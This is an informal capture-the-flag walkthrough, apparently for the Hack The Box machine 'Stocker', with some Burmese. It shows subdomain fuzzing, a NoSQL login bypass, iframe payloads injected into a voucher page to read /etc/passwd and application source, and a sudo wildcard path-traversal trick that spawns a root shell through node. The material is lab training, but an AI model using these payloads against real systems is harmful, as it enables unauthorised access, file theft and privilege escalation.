
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://stocker.htb -H "HOST: FUZZ.stocker.htb" -fc 301   => subdomain

Hacktrick ka content twe ko myar myar phat

I bypass login with this content

=> i change application => /json

and then i add bypass payload from hacktrick nosql login bypass

I was entering to the main page => i added something and i get voucher

I using burp to catch this and change with following payload

``<iframe src=/etc/passwd height=1000px width=1000px></iframe>
``<iframe src=file:///var/www/dev/index.js height=1000px width=1000px></iframe>

I get username and password from this page and i get user #### Done

I run sudo -l

I found  User angoose may run the following commands on stocker:
`    `(ALL) /usr/bin/node /usr/local/scripts/*.js   => this one
so i abuse this file 

i going to gtfo bin and i using this payload
```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

and i was run with this command  => cuz I found `*`  
sudo  /usr/bin/node /usr/local/scripts/../../../../../tmp/r0ot.js

i get fucking root haha####


![[loginpass.png]]

![[user.png]]![[root 1.png]]